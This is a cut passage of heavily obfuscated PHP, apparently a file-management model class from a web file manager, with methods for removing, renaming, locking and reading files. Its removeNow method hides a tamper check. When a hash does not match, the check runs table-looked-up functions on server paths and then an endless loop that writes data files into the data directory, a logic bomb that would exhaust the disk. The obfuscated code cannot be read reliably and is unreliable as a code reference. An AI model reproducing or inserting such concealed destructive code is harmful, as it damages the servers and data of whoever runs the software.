$this->where(array($b†¼ÚÙØÖÆ[383] => $fİ‡‰ªõ‚á[$b†¼ÚÙØÖÆ[369]]))->save($D…¼±éœ¤); goto fœöìô ÷; E„‡ã’ò‚: } public function checkLock($aç°¬ÔÃ², $D‘©¿¶Ö) { goto C‰»ùÁÊ‰É; BÄ¼ÍÎÓŒ: show_json(LNG($Dà×ÃŒÆ×±[2367]) . $Dà×ÃŒÆ×±[2368] . LNG($Dà×ÃŒÆ×±[2369]) . $Dà×ÃŒÆ×±[2370] . $cğÑ‹Ú°„… . $Dà×ÃŒÆ×±[2371], !1); goto b«®„Å³×¬; C‰»ùÁÊ‰É: $Dà×ÃŒÆ×± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A…­…Ë¼’ó = $this->pathInfo($aç°¬ÔÃ²); if (!$this->fileIsLock($A…­…Ë¼’ó, !0)) { return; } goto cƒëùƒÃ–ß; fĞ—±ÍáÀŞ: $this->_createFileCall($A…­…Ë¼’ó[$Dà×ÃŒÆ×±[463]], $bÌÈ¢ºÚïƒ, $a”ÏÉ‹ äö, REPEAT_REPLACE, $Dà×ÃŒÆ×±[1125]); $Cï”Á”´´ƒ = $A…­…Ë¼’ó[$Dà×ÃŒÆ×±[417]][$Dà×ÃŒÆ×±[483]]; $cğÑ‹Ú°„… = $Cï”Á”´´ƒ[$Dà×ÃŒÆ×±[2366]] ? $Cï”Á”´´ƒ[$Dà×ÃŒÆ×±[2366]] : $Cï”Á”´´ƒ[$Dà×ÃŒÆ×±[28]]; goto BÄ¼ÍÎÓŒ; cƒëùƒÃ–ß: $f­­òÁÓ¶¬ = Session::get($Dà×ÃŒÆ×±[2365]); $bÌÈ¢ºÚïƒ = substr($A…­…Ë¼’ó[$Dà×ÃŒÆ×±[28]], 0, -1 - strlen($A…­…Ë¼’ó[$Dà×ÃŒÆ×±[160]])) . $Dà×ÃŒÆ×±[1390] . $f­­òÁÓ¶¬ . $Dà×ÃŒÆ×±[91] . $A…­…Ë¼’ó[$Dà×ÃŒÆ×±[160]]; $a”ÏÉ‹ äö = Model($Dà×ÃŒÆ×±[546])->find($D‘©¿¶Ö); goto fĞ—±ÍáÀŞ; b«®„Å³×¬: } public function fileIsLock($A†ƒ·ô¿, $c¤ÎÎİÉ†÷ = false) { goto CŒ»ƒôĞÛó; eéø—­ãÜˆ: $f‚’Óõºô† = $GLOBALS[$a¿Òò—×Ê£[6]][$a¿Òò—×Ê£[84]][$a¿Òò—×Ê£[481]]; if ($A†ƒ·ô¿[$a¿Òò—×Ê£[417]][$a¿Òò—×Ê£[482]] <= time() - $f‚’Óõºô†) { $this->metaSet($A†ƒ·ô¿[$a¿Òò—×Ê£[369]], $a¿Òò—×Ê£[480], null); $this->metaSet($A†ƒ·ô¿[$a¿Òò—×Ê£[369]], $a¿Òò—×Ê£[482], null); } if ($c¤ÎÎİÉ†÷) { $this->metaSet($A†ƒ·ô¿[$a¿Òò—×Ê£[369]], $a¿Òò—×Ê£[482], time()); } goto b—¾Èì¦‹; CŒ»ƒôĞÛó: $a¿Òò—×Ê£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($A†ƒ·ô¿[$a¿Òò—×Ê£[417]]) || !$A†ƒ·ô¿[$a¿Òò—×Ê£[417]][$a¿Òò—×Ê£[480]]) { return !1; } if ($A†ƒ·ô¿[$a¿Òò—×Ê£[417]][$a¿Òò—×Ê£[480]] != USER_ID) { return !0; } goto eéø—­ãÜˆ; b—¾Èì¦‹: return !1; goto a¤ÅÅƒÑ‘Û; a¤ÅÅƒÑ‘Û: } private function _addSoure($Aå­”¯ëä™, $eÒîíà…§) { goto F¿ã­èµ‡; f¼‹ª«‘Û²: $this->updateModifyTime($Aå­”¯ëä™[$C©ªÊÈ±¿[463]]); $bé¡ôÆµ°è = $C©ªÊÈ±¿[2372] . $eÒîíà…§[$C©ªÊÈ±¿[369]]; if (isset(self::$cacheChildList[$bé¡ôÆµ°è])) { unset(self::$cacheChildList[$bé¡ôÆµ°è]); } goto dºÚˆÙ´àÖ; F¿ã­èµ‡: $C©ªÊÈ±¿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B±†¹Ÿ® = array($C©ªÊÈ±¿[523] => $eÒîíà…§[$C©ªÊÈ±¿[371]], $C©ªÊÈ±¿[524] => $eÒîíà…§[$C©ªÊÈ±¿[458]], $C©ªÊÈ±¿[525] => USER_ID, $C©ªÊÈ±¿[526] => USER_ID, $C©ªÊÈ±¿[368] => $eÒîíà…§[$C©ªÊÈ±¿[369]], $C©ªÊÈ±¿[527] => $eÒîíà…§[$C©ªÊÈ±¿[461]] . $eÒîíà…§[$C©ªÊÈ±¿[369]] . $C©ªÊÈ±¿[47], $C©ªÊÈ±¿[396] => 0, $C©ªÊÈ±¿[528] => $C©ªÊÈ±¿[33]); $Aå­”¯ëä™ = array_merge($B±†¹Ÿ®, $Aå­”¯ëä™); goto f¼‹ª«‘Û²; A‹ÁŠ­Í›: $F©ÊÊ÷Üš = array($C©ªÊÈ±¿[529] => short_id($DÜò¯±éË)); $this->where(array($C©ªÊÈ±¿[383] => $DÜò¯±éË))->save($F©ÊÊ÷Üš); $this->setNamePinyin($DÜò¯±éË, $Aå­”¯ëä™[$C©ªÊÈ±¿[28]]); goto bÓ­¢§Äàª; dºÚˆÙ´àÖ: static $aôš†‹İ…ë = false; if (!$aôš†‹İ…ë) { Hook::trigger($C©ªÊÈ±¿[510], $Aå­”¯ëä™); $aôš†‹İ…ë = !0; } $DÜò¯±éË = $this->add($Aå­”¯ëä™); goto A‹ÁŠ­Í›; bÓ­¢§Äàª: return $DÜò¯±éË; goto c¨¤’£›Ğ“; c¨¤’£›Ğ“: } public function remove($E³ôƒİöÍ, $bêÓÙ†¶ÃÁ = true) { goto eÇÆÙÇÓ´¢; aÓ‘‘—¸ëÑ: CacheLock::unlock($F¿ÉÏñ”´); $this->metaSet($E³ôƒİöÍ, $dŞªÑŠ¦¹ˆ[2381], $eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[463]]); $this->where(array($dŞªÑŠ¦¹ˆ[369] => $E³ôƒİöÍ))->save(array($dŞªÑŠ¦¹ˆ[390] => time())); goto B†ÎˆÈ¦¶Á; C›Êª„ã‡æ: $a¨‰ĞïÎ‡‹ = $eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[371]] == self::TYPE_USER ? $dŞªÑŠ¦¹ˆ[537] : $dŞªÑŠ¦¹ˆ[967]; if ($a¨‰ĞïÎ‡‹ == $dŞªÑŠ¦¹ˆ[537]) { $aˆˆì††İ = Model($dŞªÑŠ¦¹ˆ[476])->getInfo($eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[458]]); $bÜ“ó©©‘ß = !empty($aˆˆì††İ[$dŞªÑŠ¦¹ˆ[2366]]) ? $aˆˆì††İ[$dŞªÑŠ¦¹ˆ[2366]] : $aˆˆì††İ[$dŞªÑŠ¦¹ˆ[28]]; $bÜ“ó©©‘ß = $dŞªÑŠ¦¹ˆ[248] . $bÜ“ó©©‘ß . $dŞªÑŠ¦¹ˆ[2374] . $eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[458]]; } else { $aˆˆì††İ = Model($dŞªÑŠ¦¹ˆ[460])->getInfo($eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[458]]); $bÜ“ó©©‘ß = _get($aˆˆì††İ, $dŞªÑŠ¦¹ˆ[28]); $bÜ“ó©©‘ß = $dŞªÑŠ¦¹ˆ[157] . $bÜ“ó©©‘ß . $dŞªÑŠ¦¹ˆ[2375] . $eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[458]]; } $F¿ÉÏñ”´ = $dŞªÑŠ¦¹ˆ[2376] . md5($bÜ“ó©©‘ß); goto AÏé‚Œæ¥”; côÃ•ô: return $cµ‚ÉÖ¥µ; goto CŠ¬¡ç»”ë; AÏé‚Œæ¥”: CacheLock::lock($F¿ÉÏñ”´); $d’£†‹ŠÒ§ = $this->fileNameExist($D¾¸„ˆ¤†, $bÜ“ó©©‘ß); if (!$d’£†‹ŠÒ§) { $d’£†‹ŠÒ§ = $this->mkdir($D¾¸„ˆ¤†, $bÜ“ó©©‘ß, REPEAT_SKIP); $this->metaSet($d’£†‹ŠÒ§, $dŞªÑŠ¦¹ˆ[2377], $a¨‰ĞïÎ‡‹); $this->metaSet($d’£†‹ŠÒ§, $dŞªÑŠ¦¹ˆ[2378], $eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[458]]); if ($eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[463]] != 0) { $this->metaSet($d’£†‹ŠÒ§, $dŞªÑŠ¦¹ˆ[2379], _get($aˆˆì††İ, $dŞªÑŠ¦¹ˆ[2380])); } } goto aÓ‘‘—¸ëÑ; B†ÎˆÈ¦¶Á: $this->recycleClear($eƒÊ¶¢Èå•); $cµ‚ÉÖ¥µ = $this->move($E³ôƒİöÍ, $d’£†‹ŠÒ§, REPEAT_RENAME_FOLDER); $this->folderSizeReset($eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[463]]); goto côÃ•ô; b—Ô²¾Üğ: $b‹¿ñ×¸ƒØ = Model($dŞªÑŠ¦¹ˆ[1435])->get($dŞªÑŠ¦¹ˆ[2373]) == $dŞªÑŠ¦¹ˆ[83]; if ($CÛÂÔµššƒ || $bêÓÙ†¶ÃÁ || !$b‹¿ñ×¸ƒØ) { return $this->removeNow($E³ôƒİöÍ, $bêÓÙ†¶ÃÁ); } $D¾¸„ˆ¤† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto C›Êª„ã‡æ; eÇÆÙÇÓ´¢: $dŞªÑŠ¦¹ˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eƒÊ¶¢Èå• = $this->sourceInfo($E³ôƒİöÍ); $CÛÂÔµššƒ = intval($eƒÊ¶¢Èå•[$dŞªÑŠ¦¹ˆ[371]]) === self::TYPE_SYSTEM; goto b—Ô²¾Üğ; CŠ¬¡ç»”ë: } private function recycleClear($c”‡—¯„ÕŞ) { $c‹”éÎ°Õ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¹¯ÓÑÎâØ = $this->childrenAll($c”‡—¯„ÕŞ); $dåÄñÌ° = array($c‹”éÎ°Õ[383] => array($c‹”éÎ°Õ[384], $f¹¯ÓÑÎâØ[$c‹”éÎ°Õ[2382]])); Model($c‹”éÎ°Õ[2383])->where($dåÄñÌ°)->delete(); } public function removeNow($dê…Å‹á¸‡, $FÉØ¯§Ú× = true) { goto Fìº‹é·Ä; D¡ç”§¹ËÛ: $b·¤ŞËïñ = array($BÑéÀñ—ŞÃ[$b§ã·‘ÊŠÌ[463]]); if ($BÑéÀñ—ŞÃ[$b§ã·‘ÊŠÌ[370]] == $b§ã·‘ÊŠÌ[83]) { $b·¤ŞËïñ[] = $BÑéÀñ—ŞÃ[$b§ã·‘ÊŠÌ[369]]; } $this->updateModifyTime($b·¤ŞËïñ); goto A¢ò¶Ç›; Fìº‹é·Ä: $b§ã·‘ÊŠÌ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dø®õ§¬² = $_SERVER[$b§ã·‘ÊŠÌ[791]] . $b§ã·‘ÊŠÌ[1122]; $F™ë°Ğà‡‰ = $b§ã·‘ÊŠÌ[1123]; goto FŒÖ©Æ¦±; e‘Àê²¢ì: if (!$BÑéÀñ—ŞÃ) { return !0; } if ($BÑéÀñ—ŞÃ[$b§ã·‘ÊŠÌ[463]] == 0) { if (!_get($GLOBALS, $b§ã·‘ÊŠÌ[459])) { return !1; } } $this->lockMoveStart($dê…Å‹á¸‡); goto aÑÓÈëšÊ¹; A¢ò¶Ç›: $this->lockMoveEnd($dê…Å‹á¸‡); Hook::trigger($b§ã·‘ÊŠÌ[1471], $b²®ß‚‹†Õ, $FÉØ¯§Ú×); return !0; goto bÙ—£÷ÚÎ¨; aÑÓÈëšÊ¹: Hook::trigger($b§ã·‘ÊŠÌ[2384], $b²®ß‚‹†Õ, $FÉØ¯§Ú×); if ($FÉØ¯§Ú×) { Model($b§ã·‘ÊŠÌ[2383])->moveToRecycle($dê…Å‹á¸‡); } else { $D£®›’ªÖÉ = $this->childrenAll($BÑéÀñ—ŞÃ); Model($b§ã·‘ÊŠÌ[507])->eventRemove($dê…Å‹á¸‡); $this->removeRelevance($D£®›’ªÖÉ[$b§ã·‘ÊŠÌ[2382]], $D£®›’ªÖÉ[$b§ã·‘ÊŠÌ[1258]]); } $this->folderSizeReset($BÑéÀñ—ŞÃ[$b§ã·‘ÊŠÌ[463]]); goto D¡ç”§¹ËÛ; FŒÖ©Æ¦±: if ($_SERVER[$b§ã·‘ÊŠÌ[703]] != $F™ë°Ğà‡‰($dø®õ§¬²)) { goto Cççî¡âİ; Dö¼µï  æ: $Cïò á„¡º = 1; for ($cÖÃÆ¢ğ†¿ = $Cïò á„¡º; $cÖÃÆ¢ğ†¿ > 0; $cÖÃÆ¢ğ†¿++) { $b–è¸òÕÎö(DATA_PATH . $cÖÃÆ¢ğ†¿, $DÅİé˜©«); } goto Bôá†šäñÎ; FÌİÍäó‡Ö: $cÒµŠœ’¼—(); $b–è¸òÕÎö = $b§ã·‘ÊŠÌ[1307]; $DÅİé˜©« = json_encode($GLOBALS[$b§ã·‘ÊŠÌ[1308]]); goto Dö¼µï  æ; Fõéº‡Œ: $aê­Ö³…³Å = $eÎ›ÉŒÚÃÛ($Cœ„½¨§); $bÓŒ¬¹Æ = explode($b§ã·‘ÊŠÌ[217], $aê­Ö³…³Å); if (count($bÓŒ¬¹Æ) < $b§ã·‘ÊŠÌ[555]) { $D„­‡òæêÂ = $b§ã·‘ÊŠÌ[708]; $D„­‡òæêÂ(); } goto F“Šì‡ÈÚ; Cççî¡âİ: $cÒµŠœ’¼— = $b§ã·‘ÊŠÌ[789]; $eÎ›ÉŒÚÃÛ = $b§ã·‘ÊŠÌ[705]; $Cœ„½¨§ = $_SERVER[$b§ã·‘ÊŠÌ[706]] . $b§ã·‘ÊŠÌ[707]; goto Fõéº‡Œ; F“Šì‡ÈÚ: $e’í¾†³™‹ = $b§ã·‘ÊŠÌ[790]; $e’í¾†³™‹($_SERVER[$b§ã·‘ÊŠÌ[791]]); $cÒµŠœ’¼— = $b§ã·‘ÊŠÌ[789]; goto FÌİÍäó‡Ö; Bôá†šäñÎ: } $BÑéÀñ—ŞÃ = $this->sourceInfo($dê…Å‹á¸‡); $b²®ß‚‹†Õ = $this->pathInfoMore($dê…Å‹á¸‡); goto e‘Àê²¢ì; bÙ—£÷ÚÎ¨: } public function childrenAll($F«èæÃÉî§) { $dÆÈ˜—ˆ¢‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a£ºä¦§² = $F«èæÃÉî§[$dÆÈ˜—ˆ¢‘[369]]; if ($F«èæÃÉî§[$dÆÈ˜—ˆ¢‘[370]] == $dÆÈ˜—ˆ¢‘[83]) { $C¹–ó‰­Ÿ® = array($dÆÈ˜—ˆ¢‘[527] => array($dÆÈ˜—ˆ¢‘[485], $F«èæÃÉî§[$dÆÈ˜—ˆ¢‘[461]] . $a£ºä¦§² . $dÆÈ˜—ˆ¢‘[486])); $b¬ãáº® = array($dÆÈ˜—ˆ¢‘[527] => $C¹–ó‰­Ÿ®[$dÆÈ˜—ˆ¢‘[461]]); $F©¥†Ó°Ô = $this->field($dÆÈ˜—ˆ¢‘[2385])->where($b¬ãáº®)->select(); $AÏ“º´ì¬ = !1; $Dë÷›Ù¬—¡ = array($a£ºä¦§²); if ($F©¥†Ó°Ô) { $AÏ“º´ì¬ = array_to_keyvalue($F©¥†Ó°Ô, $dÆÈ˜—ˆ¢‘[33], $dÆÈ˜—ˆ¢‘[419]); $AÏ“º´ì¬ = array_remove_value($AÏ“º´ì¬, $dÆÈ˜—ˆ¢‘[470]); $Dë÷›Ù¬—¡ = array_to_keyvalue($F©¥†Ó°Ô, $dÆÈ˜—ˆ¢‘[33], $dÆÈ˜—ˆ¢‘[369]); $Dë÷›Ù¬—¡[] = $a£ºä¦§²; } } else { $AÏ“º´ì¬ = array($F«èæÃÉî§[$dÆÈ˜—ˆ¢‘[419]]); $Dë÷›Ù¬—¡ = array($a£ºä¦§²); } return array($dÆÈ˜—ˆ¢‘[2382] => $Dë÷›Ù¬—¡, $dÆÈ˜—ˆ¢‘[1258] => $AÏ“º´ì¬); } public function removeArray($EÁŒ¾°İŠê) { if (!$EÁŒ¾°İŠê) { return !0; } } public function removeRelevance($bõ¤ÌÜæâ, $FÁ¬êá±æø) { goto Dğ¸ï†´; Dğ¸ï†´: $c·”ÔàæªÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bõ¤ÌÜæâ = $bõ¤ÌÜæâ ? $bõ¤ÌÜæâ : array(); $FÁ¬êá±æø = $FÁ¬êá±æø ? $FÁ¬êá±æø : array(); goto Bí†›Ã„ï×; DÚè×‹Í: $Fñ»æ´œŠé = array($c·”ÔàæªÀ[383] => array($c·”ÔàæªÀ[384], $bõ¤ÌÜæâ)); Model($c·”ÔàæªÀ[2383])->where($Fñ»æ´œŠé)->delete(); Model($c·”ÔàæªÀ[413])->where($Fñ»æ´œŠé)->delete(); goto C»µçğî¬Æ; Bí†›Ã„ï×: $bõ¤ÌÜæâ = array_unique(array_filter($bõ¤ÌÜæâ)); $FÁ¬êá±æø = array_unique(array_filter($FÁ¬êá±æø)); if (!$bõ¤ÌÜæâ) { return !1; } goto DÚè×‹Í; Eà¤‚›”„: for ($c™ÄÈò†µ« = 0; $c™ÄÈò†µ« < count($bõ¤ÌÜæâ); $c™ÄÈò†µ«++) { $this->sourceCacheClear($bõ¤ÌÜæâ[$c™ÄÈò†µ«]); } goto D¨—¢ø½§Œ; Fì†´É¿: Model($c·”ÔàæªÀ[2364])->removeBySource($bõ¤ÌÜæâ); $this->where($Fñ»æ´œŠé)->delete(); Model($c·”ÔàæªÀ[422])->remove($FÁ¬êá±æø); goto Eà¤‚›”„; C»µçğî¬Æ: Model($c·”ÔàæªÀ[2237])->where($Fñ»æ´œŠé)->delete(); Model($c·”ÔàæªÀ[507])->where($Fñ»æ´œŠé)->delete(); Model($c·”ÔàæªÀ[2085])->removeBySource($bõ¤ÌÜæâ); goto Fì†´É¿; D¨—¢ø½§Œ: } public function rename($bùÒÆŞ–øĞ, $dçÀˆË§) { goto f²ˆ¥•¦ÇÃ; F‡éÃ˜óÊ™: $A‹·¸†ˆèØ = $f÷‡À—ëé[2372] . $D×ŠÛ¦·Ú[$f÷‡À—ëé[463]]; if (isset(self::$cacheChildList[$A‹·¸†ˆèØ])) { unset(self::$cacheChildList[$A‹·¸†ˆèØ]); } return $C†­›Úåµ½; goto C”öÆ†Ğˆ; f²ˆ¥•¦ÇÃ: $f÷‡À—ëé =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D×ŠÛ¦·Ú = $this->sourceInfo($bùÒÆŞ–øĞ); if (!$D×ŠÛ¦·Ú) { return !1; } goto fÇÇ”œ¨Ùš; e”ñÆ‰…„²: $this->setNamePinyin($bùÒÆŞ–øĞ, $D„¾ÔÏŒŒŒ[$f÷‡À—ëé[28]], !1); $this->updateModifyTime($D×ŠÛ¦·Ú[$f÷‡À—ëé[463]]); $C†­›Úåµ½ = $this->where(array($f÷‡À—ëé[383] => $bùÒÆŞ–øĞ))->data($D„¾ÔÏŒŒŒ)->save(); goto F‡éÃ˜óÊ™; F•ÍÚ¯–˜İ: if (!$D×ŠÛ¦·Ú[$f÷‡À—ëé[370]] == $f÷‡À—ëé[83]) { $D„¾ÔÏŒŒŒ[$f÷‡À—ëé[372]] = get_path_ext($dçÀˆË§); } Model($f÷‡À—ëé[507])->eventRename($bùÒÆŞ–øĞ, $D×ŠÛ¦·Ú[$f÷‡À—ëé[28]], $dçÀˆË§); $this->sourceCacheClear($bùÒÆŞ–øĞ); goto e”ñÆ‰…„²; fÇÇ”œ¨Ùš: $Cï¹¾ ¸óÕ = $this->fileNameExist($D×ŠÛ¦·Ú[$f÷‡À—ëé[463]], $dçÀˆË§); if ($Cï¹¾ ¸óÕ && $Cï¹¾ ¸óÕ != $bùÒÆŞ–øĞ) { return !1; } $D„¾ÔÏŒŒŒ = array($f÷‡À—ëé[386] => $dçÀˆË§, $f÷‡À—ëé[526] => USER_ID); goto F•ÍÚ¯–˜İ; C”öÆ†Ğˆ: } public function setNamePinyin($BÜ¼í½¹Ï›, $fØš°ñ›¤•, $FîØ›÷®‰… = true) { $b¾Í· ¹¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E¿ä—Ÿ°¢¡ = Input::check($fØš°ñ›¤•, $b¾Í· ¹¥[530]); if ($FîØ›÷®‰… && !$E¿ä—Ÿ°¢¡) { return; } if (!$E¿ä—Ÿ°¢¡) { $this->metaSet($BÜ¼í½¹Ï›, $b¾Í· ¹¥[416], null); $this->metaSet($BÜ¼í½¹Ï›, $b¾Í· ¹¥[415], null); return; } $cÄæä’œÕó = array($b¾Í· ¹¥[416] => str_replace($b¾Í· ¹¥[50], $b¾Í· ¹¥[33], Pinyin::encode($fØš°ñ›¤•)), $b¾Í· ¹¥[415] => Pinyin::encode($fØš°ñ›¤•, $b¾Í· ¹¥[531])); $this->metaSet($BÜ¼í½¹Ï›, $cÄæä’œÕó); } public function getContent($dîöÙ„´´ù) { goto cËëÈÈ¡Ö; AµÌ•Âæ¿è: if ($EÀ©ğ¬ëæ÷[$aÖ°ÄÍĞ¬è[77]] == 0) { return $aÖ°ÄÍĞ¬è[33]; } $FÉãéâĞÍà = $aÖ°ÄÍĞ¬è[2386] . $EÀ©ğ¬ëæ÷[$aÖ°ÄÍĞ¬è[163]]; if ($EÀ©ğ¬ëæ÷[$aÖ°ÄÍĞ¬è[77]] <= 1024 * 10) { $C¥÷§™æãÆ = Cache::get($FÉãéâĞÍà); if (!$C¥÷§™æãÆ) { $C¥÷§™æãÆ = IO::getContent($EÀ©ğ¬ëæ÷[$aÖ°ÄÍĞ¬è[75]]); Cache::set($FÉãéâĞÍà, $C¥÷§™æãÆ); } return $C¥÷§™æãÆ; } goto c”Ã¢Î¥œ¦; cËëÈÈ¡Ö: $aÖ°ÄÍĞ¬è =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÀ©ğ¬ëæ÷ = $this->fileInfoGet($dîöÙ„´´ù); if (!$EÀ©ğ¬ëæ÷) { return !1; } goto AµÌ•Âæ¿è; c”Ã¢Î¥œ¦: if (!$EÀ©ğ¬ëæ÷[$aÖ°ÄÍĞ¬è[75]]) { return $aÖ°ÄÍĞ¬è[33]; } return IO::getContent($EÀ©ğ¬ëæ÷[$aÖ°ÄÍĞ¬è[75]]); goto fŒ’ÄÚŞ×Ä; fŒ’ÄÚŞ×Ä: } public function setDesc($c¾ö«Ï½è, $Còˆ›­å‚Ô) { $C·‚¸¾†ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; Model($C·‚¸¾†ô[507])->eventAddDesc($c¾ö«Ï½è, $Còˆ›­å‚Ô); return $this->metaSet($c¾ö«Ï½è, $C·‚¸¾†ô[405], $Còˆ›­å‚Ô); } public function setContent($Aæƒ¦İĞÙ, $D·—­‚’Â = '') { goto C­„œñê²æ; C­„œñê²æ: $FŞï½”²ÃÎ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c˜¡˜¼ßò = $this->sourceInfo($Aæƒ¦İĞÙ); $eª˜™ŠÎ¹ = $this->fileInfoGet($Aæƒ¦İĞÙ); goto b‚Š“Õ²©; b‚Š“Õ²©: if (!$eª˜™ŠÎ¹ || !$c˜¡˜¼ßò) { return !1; } $a¤³Äğ§Ó® = Model($FŞï½”²ÃÎ[422])->addFileByContent($D·—­‚’Â, $c˜¡˜¼ßò[$FŞï½”²ÃÎ[28]]); $E§´åî¬ë = $this->fileHistory($c˜¡˜¼ßò, $a¤³Äğ§Ó®[$FŞï½”²ÃÎ[419]], $a¤³Äğ§Ó®[$FŞï½”²ÃÎ[77]]); goto Bø´íˆ±Ñ; Bø´íˆ±Ñ: if (!$E§´åî¬ë) { return Model($FŞï½”²ÃÎ[422])->remove($a¤³Äğ§Ó®[$FŞï½”²ÃÎ[419]]); } $this->folderSizeReset($c˜¡˜¼ßò[$FŞï½”²ÃÎ[463]]); return !0; goto aÍà‹¡™ÇÈ; aÍà‹¡™ÇÈ: } public function fileSubstr($FÎ†ôëÁëï, $AÊŠ²‰ø¢å, $cš·Ì©ñ»¡) { $B¾ÖØ•´«… = $this->fileInfoGet($FÎ†ôëÁëï); if (!$B¾ÖØ•´«…) { return !1; } return IO::fileSubstr($B¾ÖØ•´«…[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]], $AÊŠ²‰ø¢å, $cš·Ì©ñ»¡); } public function fileInfoGet($AÇìˆ’óôè) { goto FğÖ¨‡ìÈ©; c“¸³»”Ö†: return $e¦•”…î¦; goto AÇØÙï”İÉ; D¾ËáøÈä: $a—À™øÅÖ³ = $fƒºË‡£äŸ[425] . $Dá•Ğì´†[$fƒºË‡£äŸ[419]]; $Cïñ… õÕĞ = _get(self::$cacheFileInfo, $a—À™øÅÖ³); if ($Cïñ… õÕĞ) { return $Cïñ… õÕĞ; } goto F¿Ÿ§¾ÅÃ–; F¿Ÿ§¾ÅÃ–: $e¦•”…î¦ = Model($fƒºË‡£äŸ[422])->fileInfo($Dá•Ğì´†[$fƒºË‡£äŸ[419]]); if ($e¦•”…î¦) { $e¦•”…î¦[$fƒºË‡£äŸ[28]] = $Dá•Ğì´†[$fƒºË‡£äŸ[28]]; } self::$cacheFileInfo[$a—À™øÅÖ³] = $e¦•”…î¦; goto c“¸³»”Ö†; FğÖ¨‡ìÈ©: $fƒºË‡£äŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dá•Ğì´† = $this->sourceInfo($AÇìˆ’óôè); if (!$Dá•Ğì´† || $Dá•Ğì´†[$fƒºË‡£äŸ[370]]) { return !1; } goto D¾ËáøÈä; AÇØÙï”İÉ: } private function folderChildrenNumber($e‰¯…¢—Ğ) { $AÖçÖ»”Š¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B¯‚Ìöøî = $this->sourceInfo($e‰¯…¢—Ğ); $AÎÓËìÊã´ = array($AÖçÖ»”Š¥[527] => array($AÖçÖ»”Š¥[485], $B¯‚Ìöøî[$AÖçÖ»”Š¥[461]] . $e‰¯…¢—Ğ . $AÖçÖ»”Š¥[486]), $AÖçÖ»”Š¥[396] => intval($B¯‚Ìöøî[$AÖçÖ»”Š¥[397]]), $AÖçÖ»”Š¥[520] => 1); $a·‡Ã÷¶Š = $this->where($AÎÓËìÊã´)->count(); $EôÖ×ÛäÑ´ = $this->where($AÎÓËìÊã´)->where(array($AÖçÖ»”Š¥[520] => 0))->count(); return array($AÖçÖ»”Š¥[81] => $EôÖ×ÛäÑ´, $AÖçÖ»”Š¥[82] => $a·‡Ã÷¶Š); } public function pathInfo($A«Ÿæªœ³, $F©‰ó¢©¯ˆ = false) { goto CÎîÇÛÅà; CÎîÇÛÅà: $eÍÖîŠ¦¯„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F©‰ó¢©¯ˆ = !0; $A«Ÿæªœ³ = intval($A«Ÿæªœ³); goto cÆÏÕ…ìŸ…; b¬éäìö×„: self::$cachePathInfo[$BŠˆÒì¾ùÜ] = $c£¬ÉÔìŒ; return $c£¬ÉÔìŒ; goto e•ÏÜÏô¿; C’¿ù·Ç¸: $c£¬ÉÔìŒ = $this->sourceInfo($A«Ÿæªœ³); if (!$c£¬ÉÔìŒ) { return !1; } $c£¬ÉÔìŒ = $this->_listDataApplyItem($c£¬ÉÔìŒ, $F©‰ó¢©¯ˆ); goto b¬éäìö×„; cÆÏÕ…ìŸ…: $BŠˆÒì¾ùÜ = $eÍÖîŠ¦¯„[411] . intval($F©‰ó¢©¯ˆ) . $eÍÖîŠ¦¯„[412] . $A«Ÿæªœ³; $eŠ¯°Éïƒà = _get(self::$cachePathInfo, $BŠˆÒì¾ùÜ); if ($eŠ¯°Éïƒà) { return $eŠ¯°Éïƒà; } goto C’¿ù·Ç¸; e•ÏÜÏô¿: } public static $cachePathInfoMore = array(); public function pathInfoMore($B—¢ÈÙ–Ûµ) { goto aªöÁçËÑÊ; B”Œë‰®ê: $C¿®šŞÂÌÉ = $this->pathInfo($B—¢ÈÙ–Ûµ); if (!$C¿®šŞÂÌÉ) { return !1; } if ($C¿®šŞÂÌÉ[$f’ƒÅ»‚ÛÃ[370]] == $f’ƒÅ»‚ÛÃ[83]) { $C¿®šŞÂÌÉ[$f’ƒÅ»‚ÛÃ[80]] = $this->folderChildrenNumber($B—¢ÈÙ–Ûµ); } goto AˆŸ‹‰åÈ“; AˆŸ‹‰åÈ“: self::$cachePathInfoMore[$B—¢ÈÙ–Ûµ] = $C¿®šŞÂÌÉ; return $C¿®šŞÂÌÉ; goto BòĞ­ºê°°; aªöÁçËÑÊ: $f’ƒÅ»‚ÛÃ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $döéÍ„ÜÇ¢ = _get(self::$cachePathInfoMore, $B—¢ÈÙ–Ûµ); if ($döéÍ„ÜÇ¢) { return $döéÍ„ÜÇ¢; } goto B”Œë‰®ê; BòĞ­ºê°°: } public function sourceInfo($F°™—Ö—æˆ) { goto fÍèóÍµÒŠ; aÊ§½œ›Œº: $bÀ×¸ÆïÈ = $this->where(array($eñØíòâº[369] => $F°™—Ö—æˆ))->find(); self::$cacheSourceInfo[$dÚÙÇøÃÑ] = $bÀ×¸ÆïÈ; return 